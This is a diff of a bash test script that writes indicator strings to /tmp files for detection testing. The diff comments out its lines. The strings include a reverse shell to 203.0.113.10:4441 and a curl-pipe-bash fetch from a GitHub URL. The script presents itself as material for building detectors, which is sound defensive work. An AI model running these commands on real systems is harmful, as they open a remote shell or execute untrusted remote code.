@@ -13,23 +13,11 @@
 # USE AT YOUR OWN RISK. The author provides no warranty and assumes no
 # liability for misuse. Do not modify this script to perform real attacks.
 # -----------------------------------------------------------------------------
-##################################################################
-###################################################################
-###### FORCE
-echo "[*] Starting MIRROR bot.sh test script..."
-echo "[*] This script is for educational and security testing purposes only."
-echo "[*] It does NOT execute any malicious actions — it only writes *strings*"
-echo "[*] resembling common attack commands (e.g., reverse shells, curl|bash)"
-echo "[*] to files for static analysis and detection testing."
-echo "[*] USE AT YOUR OWN RISK. The author provides no warranty and assumes no
-echo "[*] liability for misuse. Do not modify this script to perform real attacks."
-echo "###################################################################"
-echo "###################################################################"
-#!/usr/bin/env bash
-set -euo pipefail
-echo "bash -i >& /dev/tcp/203.0.113.10/4441 0>&1" > /tmp/revshell_ioc.txt
-echo "curl -fsSL https://github.com/opensource-for-freedom/MIRROR.git | bash" > /tmp/curlbash_ioc.txt
-curl -fsI https://github.com/opensource-for-freedom/MIRROR.git >/dev/null || true
-echo "[*] Test complete."
+
+# set -euo pipefail
+#echo "bash -i >& /dev/tcp/203.0.113.10/4441 0>&1" > /tmp/revshell_ioc.txt
+#echo "curl -fsSL https://github.com/opensource-for-freedom/MIRROR.git | bash" > /tmp/curlbash_ioc.txt
+#curl -fsI https://github.com/opensource-for-freedom/MIRROR.git >/dev/null || true
+#echo "[*] Test complete."
 
 
